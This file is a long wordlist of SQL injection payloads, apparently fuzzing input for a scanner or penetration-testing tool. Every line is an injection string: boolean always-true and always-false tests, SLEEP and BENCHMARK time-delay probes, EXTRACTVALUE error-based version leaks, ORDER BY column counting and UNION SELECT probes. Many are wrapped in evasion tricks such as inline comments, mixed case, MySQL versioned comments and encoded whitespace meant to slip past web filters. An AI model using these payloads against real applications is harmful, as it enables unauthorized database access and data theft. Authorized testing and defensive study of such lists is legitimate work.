  '" A/**/ND '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" A/**/ND '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '" A/**/ND 1=1#'
  '" A/**/ND 1=1--'
  '" A/**/ND 1=1-- -'
  '" A/**/ND 1=2--'
  '" A/**/ND BENC/**/HMARK(10000000,MD5(1))--'
  '" A/**/ND BENC/**/HMARK(5000000,MD5(1))--'
  '" A/**/ND BENC/**/HMARK(50000000,MD5(1))--'
  '" A/**/ND BENCHMARK(10000000,MD5(1))--'
  '" A/**/ND BENCHMARK(5000000,MD5(1))--'
  '" A/**/ND BENCHMARK(50000000,MD5(1))--'
  '" A/**/ND EXTRAC/**/TVALUE(1,CONCAT(0x7e,(SELECT @@version)))--'
  '" A/**/ND EXTRACTVALUE(1,CONCAT(0x7e,(/*!50000SELECT*/ @@version)))--'
  '" A/**/ND EXTRACTVALUE(1,CONCAT(0x7e,(SEL/**/ECT @@version)))--'
  '" A/**/ND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--'
  '" A/**/ND SL/**/EEP(0)--'
  '" A/**/ND SL/**/EEP(1)--'
  '" A/**/ND SL/**/EEP(10)--'
  '" A/**/ND SL/**/EEP(15)--'
  '" A/**/ND SL/**/EEP(2)--'
  '" A/**/ND SL/**/EEP(3)--'
  '" A/**/ND SL/**/EEP(5)--'
  '" A/**/ND SLEEP(0)--'
  '" A/**/ND SLEEP(1)--'
  '" A/**/ND SLEEP(10)--'
  '" A/**/ND SLEEP(15)--'
  '" A/**/ND SLEEP(2)--'
  '" A/**/ND SLEEP(3)--'
  '" A/**/ND SLEEP(5)--'
  '" A/**/nD '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" A/**/nD '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '" A/**/nD 1=1#'
  '" A/**/nD 1=1--'
  '" A/**/nD 1=1-- -'
  '" A/**/nD 1=2--'
  '" A/**/nD BeNcHmArK(10000000,mD5(1))--'
  '" A/**/nD BeNcHmArK(5000000,Md5(1))--'
  '" A/**/nD BeNcHmArK(50000000,mD5(1))--'
  '" A/**/nD ExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt @@vErSiOn)))--'
  '" A/**/nD SlEeP(0)--'
  '" A/**/nD SlEeP(1)--'
  '" A/**/nD SlEeP(10)--'
  '" A/**/nD SlEeP(15)--'
  '" A/**/nD SlEeP(2)--'
  '" A/**/nD SlEeP(3)--'
  '" A/**/nD SlEeP(5)--'
  '" AND '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" AND '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '" AND 1=1#'
  '" AND 1=1--'
  '" AND 1=1-- -'
  '" AND 1=2--'
  '" AND BENC/**/HMARK(10000000,MD5(1))--'
  '" AND BENC/**/HMARK(5000000,MD5(1))--'
  '" AND BENC/**/HMARK(50000000,MD5(1))--'
  '" AND BENCHMARK(10000000,MD5(1))--'
  '" AND BENCHMARK(5000000,MD5(1))--'
  '" AND BENCHMARK(50000000,MD5(1))--'
  '" AND EXTRAC/**/TVALUE(1,CONCAT(0x7e,(/*!50000SELECT*/ @@version)))--'
  '" AND EXTRAC/**/TVALUE(1,CONCAT(0x7e,(SEL/**/ECT @@version)))--'
  '" AND EXTRAC/**/TVALUE(1,CONCAT(0x7e,(SELECT @@version)))--'
  '" AND EXTRACTVALUE(1,CONCAT(0x7e,(/*!50000/*!50000SELECT*/*/ @@version)))--'
  '" AND EXTRACTVALUE(1,CONCAT(0x7e,(/*!50000SEL/**/ECT*/ @@version)))--'
  '" AND EXTRACTVALUE(1,CONCAT(0x7e,(/*!50000SELECT*/ @@version)))--'
  '" AND EXTRACTVALUE(1,CONCAT(0x7e,(SEL/**/ECT @@version)))--'
  '" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--'
  '" AND SL/**/EEP(0)--'
  '" AND SL/**/EEP(1)--'
  '" AND SL/**/EEP(10)--'
  '" AND SL/**/EEP(15)--'
  '" AND SL/**/EEP(2)--'
  '" AND SL/**/EEP(3)--'
  '" AND SL/**/EEP(5)--'
  '" AND SLEEP(0)--'
  '" AND SLEEP(1)--'
  '" AND SLEEP(10)--'
  '" AND SLEEP(15)--'
  '" AND SLEEP(2)--'
  '" AND SLEEP(3)--'
  '" AND SLEEP(5)--'
  '" AnD '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" AnD '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '" AnD 1=1#'
  '" AnD 1=1--'
  '" AnD 1=1-- -'
  '" AnD 1=2--'
  '" AnD BeNc/**/HmArK(10000000,mD5(1))--'
  '" AnD BeNc/**/HmArK(5000000,Md5(1))--'
  '" AnD BeNc/**/HmArK(50000000,mD5(1))--'
  '" AnD BeNcHmArK(10000000,mD5(1))--'
  '" AnD BeNcHmArK(5000000,Md5(1))--'
  '" AnD BeNcHmArK(50000000,mD5(1))--'
  '" AnD ExTrAc/**/TvAlUe(1,cOnCaT(0x7e,(SeLeCt @@vErSiOn)))--'
  '" AnD ExTrAcTvAlUe(1,cOnCaT(0x7e,(/*!50000SELECT*/ @@vErSiOn)))--'
  '" AnD ExTrAcTvAlUe(1,cOnCaT(0x7e,(/*!50000SeLeCt*/ @@vErSiOn)))--'
  '" AnD ExTrAcTvAlUe(1,cOnCaT(0x7e,(SeL/**/eCt @@vErSiOn)))--'
  '" AnD ExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt @@vErSiOn)))--'
  '" AnD Sl/**/EeP(0)--'
  '" AnD Sl/**/EeP(1)--'
  '" AnD Sl/**/EeP(10)--'
  '" AnD Sl/**/EeP(15)--'
  '" AnD Sl/**/EeP(2)--'
  '" AnD Sl/**/EeP(3)--'
  '" AnD Sl/**/EeP(5)--'
  '" AnD SlEeP(0)--'
  '" AnD SlEeP(1)--'
  '" AnD SlEeP(10)--'
  '" AnD SlEeP(15)--'
  '" AnD SlEeP(2)--'
  '" AnD SlEeP(3)--'
  '" AnD SlEeP(5)--'
  '" O/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" O/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '" O/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" O/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '" O/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" O/**/R 1=1#'
  '" O/**/R 1=1--'
  '" O/**/R 1=1-- -'
  '" O/**/R BENC/**/HMARK(10000000,MD5(1))--'
  '" O/**/R BENCHMARK(10000000,MD5(1))--'
  '" O/**/R SL/**/EEP(0)--'
  '" O/**/R SL/**/EEP(1)--'
  '" O/**/R SL/**/EEP(10)--'
  '" O/**/R SL/**/EEP(15)--'
  '" O/**/R SL/**/EEP(2)--'
  '" O/**/R SL/**/EEP(3)--'
  '" O/**/R SL/**/EEP(5)--'
  '" O/**/R SLEEP(0)--'
  '" O/**/R SLEEP(1)--'
  '" O/**/R SLEEP(10)--'
  '" O/**/R SLEEP(15)--'
  '" O/**/R SLEEP(2)--'
  '" O/**/R SLEEP(3)--'
  '" O/**/R SLEEP(5)--'
  '" O/**/R%091=1--'
  '" O/**/R%0a1=1--'
  '" O/**/R%0d1=1--'
  '" O/**/R/**/DER BY 1--'
  '" O/**/R/**/DER BY 10--'
  '" O/**/R/**/DER BY 11--'
  '" O/**/R/**/DER BY 12--'
  '" O/**/R/**/DER BY 13--'
  '" O/**/R/**/DER BY 14--'
  '" O/**/R/**/DER BY 15--'
  '" O/**/R/**/DER BY 2--'
  '" O/**/R/**/DER BY 3--'
  '" O/**/R/**/DER BY 4--'
  '" O/**/R/**/DER BY 5--'
  '" O/**/R/**/DER BY 6--'
  '" O/**/R/**/DER BY 7--'
  '" O/**/R/**/DER BY 8--'
  '" O/**/R/**/DER BY 9--'
  '" O/**/RDER BY 1--'
  '" O/**/RDER BY 10--'
  '" O/**/RDER BY 11--'
  '" O/**/RDER BY 12--'
  '" O/**/RDER BY 13--'
  '" O/**/RDER BY 14--'
  '" O/**/RDER BY 15--'
  '" O/**/RDER BY 2--'
  '" O/**/RDER BY 3--'
  '" O/**/RDER BY 4--'
  '" O/**/RDER BY 5--'
  '" O/**/RDER BY 6--'
  '" O/**/RDER BY 7--'
  '" O/**/RDER BY 8--'
  '" O/**/RDER BY 9--'
  '" O/**/r '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" O/**/r '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '" O/**/r '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" O/**/r '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'
  '" O/**/r '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" O/**/r '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '" O/**/r '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" O/**/r 1=1#'
  '" O/**/r 1=1--'
  '" O/**/r 1=1-- -'
  '" O/**/r bEnChMaRk(10000000,Md5(1))--'
  '" O/**/r sLeEp(0)--'
  '" O/**/r sLeEp(1)--'
  '" O/**/r sLeEp(10)--'
  '" O/**/r sLeEp(15)--'
  '" O/**/r sLeEp(2)--'
  '" O/**/r sLeEp(3)--'
  '" O/**/r sLeEp(5)--'
  '" O/**/r%091=1--'
  '" O/**/r%0A1=1--'
  '" O/**/r%0D1=1--'
  '" O/**/rDeR By 1--'
  '" O/**/rDeR By 10--'
  '" O/**/rDeR By 11--'
  '" O/**/rDeR By 12--'
  '" O/**/rDeR By 13--'
  '" O/**/rDeR By 14--'
  '" O/**/rDeR By 15--'
  '" O/**/rDeR By 2--'
  '" O/**/rDeR By 3--'
  '" O/**/rDeR By 4--'
  '" O/**/rDeR By 5--'
  '" O/**/rDeR By 6--'
  '" O/**/rDeR By 7--'
  '" O/**/rDeR By 8--'
  '" O/**/rDeR By 9--'
  '" OO/**/RR 1=1--'
  '" OORR 1=1--'
  '" OR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" OR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '" OR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" OR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '" OR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" OR 1=1#'
  '" OR 1=1--'
  '" OR 1=1-- -'
  '" OR BENC/**/HMARK(10000000,MD5(1))--'
  '" OR BENCHMARK(10000000,MD5(1))--'
  '" OR SL/**/EEP(0)--'
  '" OR SL/**/EEP(1)--'
  '" OR SL/**/EEP(10)--'
  '" OR SL/**/EEP(15)--'
  '" OR SL/**/EEP(2)--'
  '" OR SL/**/EEP(3)--'
  '" OR SL/**/EEP(5)--'
  '" OR SLEEP(0)--'
  '" OR SLEEP(1)--'
  '" OR SLEEP(10)--'
  '" OR SLEEP(15)--'
  '" OR SLEEP(2)--'
  '" OR SLEEP(3)--'
  '" OR SLEEP(5)--'
  '" OR%091=1--'
  '" OR%0a1=1--'
  '" OR%0d1=1--'
  '" OR/**/DER BY 1--'
  '" OR/**/DER BY 10--'
  '" OR/**/DER BY 11--'
  '" OR/**/DER BY 12--'
  '" OR/**/DER BY 13--'
  '" OR/**/DER BY 14--'
  '" OR/**/DER BY 15--'
  '" OR/**/DER BY 2--'
  '" OR/**/DER BY 3--'
  '" OR/**/DER BY 4--'
  '" OR/**/DER BY 5--'
  '" OR/**/DER BY 6--'
  '" OR/**/DER BY 7--'
  '" OR/**/DER BY 8--'
  '" OR/**/DER BY 9--'
  '" ORDER BY 1--'
  '" ORDER BY 10--'
  '" ORDER BY 11--'
  '" ORDER BY 12--'
  '" ORDER BY 13--'
  '" ORDER BY 14--'
  '" ORDER BY 15--'
  '" ORDER BY 2--'
  '" ORDER BY 3--'
  '" ORDER BY 4--'
  '" ORDER BY 5--'
  '" ORDER BY 6--'
  '" ORDER BY 7--'
  '" ORDER BY 8--'
  '" ORDER BY 9--'
  '" Oo/**/Rr 1=1--'
  '" OoRr 1=1--'
  '" Or '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" Or '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '" Or '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" Or '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'
  '" Or '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" Or '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '" Or '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" Or 1=1#'
  '" Or 1=1--'
  '" Or 1=1-- -'
  '" Or bEnC/**/hMaRk(10000000,Md5(1))--'
  '" Or bEnChMaRk(10000000,Md5(1))--'
  '" Or sL/**/eEp(0)--'
  '" Or sL/**/eEp(1)--'
  '" Or sL/**/eEp(10)--'
  '" Or sL/**/eEp(15)--'
  '" Or sL/**/eEp(2)--'
  '" Or sL/**/eEp(3)--'
  '" Or sL/**/eEp(5)--'
  '" Or sLeEp(0)--'
  '" Or sLeEp(1)--'
  '" Or sLeEp(10)--'
  '" Or sLeEp(15)--'
  '" Or sLeEp(2)--'
  '" Or sLeEp(3)--'
  '" Or sLeEp(5)--'
  '" Or%091=1--'
  '" Or%0A1=1--'
  '" Or%0D1=1--'
  '" Or/**/DeR By 1--'
  '" Or/**/DeR By 10--'
  '" Or/**/DeR By 11--'
  '" Or/**/DeR By 12--'
  '" Or/**/DeR By 13--'
  '" Or/**/DeR By 14--'
  '" Or/**/DeR By 15--'
  '" Or/**/DeR By 2--'
  '" Or/**/DeR By 3--'
  '" Or/**/DeR By 4--'
  '" Or/**/DeR By 5--'
  '" Or/**/DeR By 6--'
  '" Or/**/DeR By 7--'
  '" Or/**/DeR By 8--'
  '" Or/**/DeR By 9--'
  '" OrDeR By 1--'
  '" OrDeR By 10--'
  '" OrDeR By 11--'
  '" OrDeR By 12--'
  '" OrDeR By 13--'
  '" OrDeR By 14--'
  '" OrDeR By 15--'
  '" OrDeR By 2--'
  '" OrDeR By 3--'
  '" OrDeR By 4--'
  '" OrDeR By 5--'
  '" OrDeR By 6--'
  '" OrDeR By 7--'
  '" OrDeR By 8--'
  '" OrDeR By 9--'
  '" UN/**/ION /*!50000SELECT*/ 1,2,3,4,5--'
  '" UN/**/ION /*!50000SELECT*/ 1,2,3,4--'
  '" UN/**/ION /*!50000SELECT*/ 1,2,3--'
  '" UN/**/ION /*!50000SELECT*/ 1,2--'
  '" UN/**/ION /*!50000SELECT*/ 1--'
  '" UN/**/ION /*!50000SELECT*/ NULL,NULL,NULL,NULL--'
  '" UN/**/ION /*!50000SELECT*/ NULL,NULL,NULL--'
  '" UN/**/ION /*!50000SELECT*/ NULL,NULL--'
  '" UN/**/ION /*!50000SELECT*/ NULL--'
  '" UN/**/ION ALL /*!50000SELECT*/ 1,2,3,4,5--'
  '" UN/**/ION ALL /*!50000SELECT*/ 1,2,3,4--'
  '" UN/**/ION ALL /*!50000SELECT*/ 1,2,3--'
  '" UN/**/ION ALL /*!50000SELECT*/ 1,2--'
  '" UN/**/ION ALL /*!50000SELECT*/ 1--'
  '" UN/**/ION ALL SEL/**/ECT 1,2,3,4,5--'
  '" UN/**/ION ALL SEL/**/ECT 1,2,3,4--'
  '" UN/**/ION ALL SEL/**/ECT 1,2,3--'
  '" UN/**/ION ALL SEL/**/ECT 1,2--'
  '" UN/**/ION ALL SEL/**/ECT 1--'
  '" UN/**/ION ALL SELECT 1,2,3,4,5--'
  '" UN/**/ION ALL SELECT 1,2,3,4--'
  '" UN/**/ION ALL SELECT 1,2,3--'
  '" UN/**/ION ALL SELECT 1,2--'
  '" UN/**/ION ALL SELECT 1--'
  '" UN/**/ION SEL/**/ECT 1,2,3,4,5--'
  '" UN/**/ION SEL/**/ECT 1,2,3,4--'
  '" UN/**/ION SEL/**/ECT 1,2,3--'
  '" UN/**/ION SEL/**/ECT 1,2--'
  '" UN/**/ION SEL/**/ECT 1--'
  '" UN/**/ION SEL/**/ECT NULL,NULL,NULL,NULL--'
  '" UN/**/ION SEL/**/ECT NULL,NULL,NULL--'
  '" UN/**/ION SEL/**/ECT NULL,NULL--'
  '" UN/**/ION SEL/**/ECT NULL--'
  '" UN/**/ION SELECT 1,2,3,4,5--'
  '" UN/**/ION SELECT 1,2,3,4--'
  '" UN/**/ION SELECT 1,2,3--'
  '" UN/**/ION SELECT 1,2--'
  '" UN/**/ION SELECT 1--'
  '" UN/**/ION SELECT NULL,NULL,NULL,NULL--'
  '" UN/**/ION SELECT NULL,NULL,NULL--'
  '" UN/**/ION SELECT NULL,NULL--'
  '" UN/**/ION SELECT NULL--'
  '" UNION /*!50000/*!50000SELECT*/*/ 1,2,3,4,5--'
  '" UNION /*!50000/*!50000SELECT*/*/ 1,2,3,4--'
  '" UNION /*!50000/*!50000SELECT*/*/ 1,2,3--'
  '" UNION /*!50000/*!50000SELECT*/*/ 1,2--'
  '" UNION /*!50000/*!50000SELECT*/*/ 1--'
  '" UNION /*!50000/*!50000SELECT*/*/ NULL,NULL,NULL,NULL--'
  '" UNION /*!50000/*!50000SELECT*/*/ NULL,NULL,NULL--'
  '" UNION /*!50000/*!50000SELECT*/*/ NULL,NULL--'
  '" UNION /*!50000/*!50000SELECT*/*/ NULL--'
  '" UNION /*!50000SEL/**/ECT*/ 1,2,3,4,5--'
  '" UNION /*!50000SEL/**/ECT*/ 1,2,3,4--'
  '" UNION /*!50000SEL/**/ECT*/ 1,2,3--'
  '" UNION /*!50000SEL/**/ECT*/ 1,2--'
  '" UNION /*!50000SEL/**/ECT*/ 1--'
  '" UNION /*!50000SEL/**/ECT*/ NULL,NULL,NULL,NULL--'
  '" UNION /*!50000SEL/**/ECT*/ NULL,NULL,NULL--'
  '" UNION /*!50000SEL/**/ECT*/ NULL,NULL--'
  '" UNION /*!50000SEL/**/ECT*/ NULL--'
  '" UNION /*!50000SELECT*/ 1,2,3,4,5--'
  '" UNION /*!50000SELECT*/ 1,2,3,4--'
  '" UNION /*!50000SELECT*/ 1,2,3--'
  '" UNION /*!50000SELECT*/ 1,2--'
  '" UNION /*!50000SELECT*/ 1--'
  '" UNION /*!50000SELECT*/ NULL,NULL,NULL,NULL--'
  '" UNION /*!50000SELECT*/ NULL,NULL,NULL--'
  '" UNION /*!50000SELECT*/ NULL,NULL--'
  '" UNION /*!50000SELECT*/ NULL--'
  '" UNION ALL /*!50000/*!50000SELECT*/*/ 1,2,3,4,5--'
  '" UNION ALL /*!50000/*!50000SELECT*/*/ 1,2,3,4--'
  '" UNION ALL /*!50000/*!50000SELECT*/*/ 1,2,3--'
  '" UNION ALL /*!50000/*!50000SELECT*/*/ 1,2--'
  '" UNION ALL /*!50000/*!50000SELECT*/*/ 1--'
  '" UNION ALL /*!50000SEL/**/ECT*/ 1,2,3,4,5--'
  '" UNION ALL /*!50000SEL/**/ECT*/ 1,2,3,4--'
  '" UNION ALL /*!50000SEL/**/ECT*/ 1,2,3--'
  '" UNION ALL /*!50000SEL/**/ECT*/ 1,2--'
  '" UNION ALL /*!50000SEL/**/ECT*/ 1--'
  '" UNION ALL /*!50000SELECT*/ 1,2,3,4,5--'
  '" UNION ALL /*!50000SELECT*/ 1,2,3,4--'
  '" UNION ALL /*!50000SELECT*/ 1,2,3--'
  '" UNION ALL /*!50000SELECT*/ 1,2--'
  '" UNION ALL /*!50000SELECT*/ 1--'
  '" UNION ALL SEL/**/ECT 1,2,3,4,5--'
  '" UNION ALL SEL/**/ECT 1,2,3,4--'
  '" UNION ALL SEL/**/ECT 1,2,3--'
  '" UNION ALL SEL/**/ECT 1,2--'
  '" UNION ALL SEL/**/ECT 1--'
  '" UNION ALL SELECT 1,2,3,4,5--'
  '" UNION ALL SELECT 1,2,3,4--'
  '" UNION ALL SELECT 1,2,3--'
  '" UNION ALL SELECT 1,2--'
  '" UNION ALL SELECT 1--'
  '" UNION SEL/**/ECT 1,2,3,4,5--'
  '" UNION SEL/**/ECT 1,2,3,4--'
  '" UNION SEL/**/ECT 1,2,3--'
  '" UNION SEL/**/ECT 1,2--'
  '" UNION SEL/**/ECT 1--'
  '" UNION SEL/**/ECT NULL,NULL,NULL,NULL--'
  '" UNION SEL/**/ECT NULL,NULL,NULL--'
  '" UNION SEL/**/ECT NULL,NULL--'
  '" UNION SEL/**/ECT NULL--'
  '" UNION SELECT 1,2,3,4,5--'
  '" UNION SELECT 1,2,3,4--'
  '" UNION SELECT 1,2,3--'
  '" UNION SELECT 1,2--'
  '" UNION SELECT 1--'
  '" UNION SELECT NULL,NULL,NULL,NULL--'
  '" UNION SELECT NULL,NULL,NULL--'
  '" UNION SELECT NULL,NULL--'
  '" UNION SELECT NULL--'
  '" Un/**/IoN AlL SeLeCt 1,2,3,4,5--'
  '" Un/**/IoN AlL SeLeCt 1,2,3,4--'
  '" Un/**/IoN AlL SeLeCt 1,2,3--'
  '" Un/**/IoN AlL SeLeCt 1,2--'
  '" Un/**/IoN AlL SeLeCt 1--'
  '" Un/**/IoN SeLeCt 1,2,3,4,5--'
  '" Un/**/IoN SeLeCt 1,2,3,4--'
  '" Un/**/IoN SeLeCt 1,2,3--'
  '" Un/**/IoN SeLeCt 1,2--'
  '" Un/**/IoN SeLeCt 1--'
  '" Un/**/IoN SeLeCt nUlL,NuLl,nUlL,NuLl--'
  '" Un/**/IoN SeLeCt nUlL,NuLl,nUlL--'
  '" Un/**/IoN SeLeCt nUlL,NuLl--'
  '" Un/**/IoN SeLeCt nUlL--'
  '" UnIoN /*!50000SELECT*/ 1,2,3,4,5--'
  '" UnIoN /*!50000SELECT*/ 1,2,3,4--'
  '" UnIoN /*!50000SELECT*/ 1,2,3--'
  '" UnIoN /*!50000SELECT*/ 1,2--'
  '" UnIoN /*!50000SELECT*/ 1--'
  '" UnIoN /*!50000SELECT*/ nUlL,NuLl,nUlL,NuLl--'
  '" UnIoN /*!50000SELECT*/ nUlL,NuLl,nUlL--'
  '" UnIoN /*!50000SELECT*/ nUlL,NuLl--'
  '" UnIoN /*!50000SELECT*/ nUlL--'
  '" UnIoN /*!50000SeLeCt*/ 1,2,3,4,5--'
  '" UnIoN /*!50000SeLeCt*/ 1,2,3,4--'
  '" UnIoN /*!50000SeLeCt*/ 1,2,3--'
  '" UnIoN /*!50000SeLeCt*/ 1,2--'
  '" UnIoN /*!50000SeLeCt*/ 1--'
  '" UnIoN /*!50000SeLeCt*/ nUlL,NuLl,nUlL,NuLl--'
  '" UnIoN /*!50000SeLeCt*/ nUlL,NuLl,nUlL--'
  '" UnIoN /*!50000SeLeCt*/ nUlL,NuLl--'
  '" UnIoN /*!50000SeLeCt*/ nUlL--'
  '" UnIoN AlL /*!50000SELECT*/ 1,2,3,4,5--'
  '" UnIoN AlL /*!50000SELECT*/ 1,2,3,4--'
  '" UnIoN AlL /*!50000SELECT*/ 1,2,3--'
  '" UnIoN AlL /*!50000SELECT*/ 1,2--'
  '" UnIoN AlL /*!50000SELECT*/ 1--'
  '" UnIoN AlL /*!50000SeLeCt*/ 1,2,3,4,5--'
  '" UnIoN AlL /*!50000SeLeCt*/ 1,2,3,4--'
  '" UnIoN AlL /*!50000SeLeCt*/ 1,2,3--'
  '" UnIoN AlL /*!50000SeLeCt*/ 1,2--'
  '" UnIoN AlL /*!50000SeLeCt*/ 1--'
  '" UnIoN AlL SeL/**/eCt 1,2,3,4,5--'
  '" UnIoN AlL SeL/**/eCt 1,2,3,4--'
  '" UnIoN AlL SeL/**/eCt 1,2,3--'
  '" UnIoN AlL SeL/**/eCt 1,2--'
  '" UnIoN AlL SeL/**/eCt 1--'
  '" UnIoN AlL SeLeCt 1,2,3,4,5--'
  '" UnIoN AlL SeLeCt 1,2,3,4--'
  '" UnIoN AlL SeLeCt 1,2,3--'
  '" UnIoN AlL SeLeCt 1,2--'
  '" UnIoN AlL SeLeCt 1--'
  '" UnIoN SeL/**/eCt 1,2,3,4,5--'
  '" UnIoN SeL/**/eCt 1,2,3,4--'
  '" UnIoN SeL/**/eCt 1,2,3--'
  '" UnIoN SeL/**/eCt 1,2--'
  '" UnIoN SeL/**/eCt 1--'
  '" UnIoN SeL/**/eCt nUlL,NuLl,nUlL,NuLl--'
  '" UnIoN SeL/**/eCt nUlL,NuLl,nUlL--'
  '" UnIoN SeL/**/eCt nUlL,NuLl--'
  '" UnIoN SeL/**/eCt nUlL--'
  '" UnIoN SeLeCt 1,2,3,4,5--'
  '" UnIoN SeLeCt 1,2,3,4--'
  '" UnIoN SeLeCt 1,2,3--'
  '" UnIoN SeLeCt 1,2--'
